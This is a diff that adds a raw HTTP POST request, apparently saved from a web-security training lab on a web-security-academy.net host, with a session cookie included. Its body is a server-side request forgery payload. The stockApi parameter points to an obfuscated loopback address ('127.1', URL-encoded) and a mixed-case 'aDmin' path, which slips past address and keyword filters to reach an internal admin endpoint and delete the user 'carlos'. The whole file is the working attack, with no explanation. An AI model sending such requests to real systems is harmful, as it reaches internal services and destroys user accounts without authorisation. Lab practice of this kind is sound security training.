@@ -1,0 +1,20 @@
+POST /product/stock HTTP/1.1
+Host: ac331f971f08e081c13ab98800c20094.web-security-academy.net
+Cookie: session=gNE7xxGUquUFCdP7qmFGDqTggeWNuxBZ
+Content-Length: 58
+Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
+Sec-Ch-Ua-Platform: "macOS"
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
+Origin: https://ac331f971f08e081c13ab98800c20094.web-security-academy.net
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://ac331f971f08e081c13ab98800c20094.web-security-academy.net/product?productId=1
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+stockApi=http%3a%2f%2f127%2e1/aDmin/delete?username=carlos
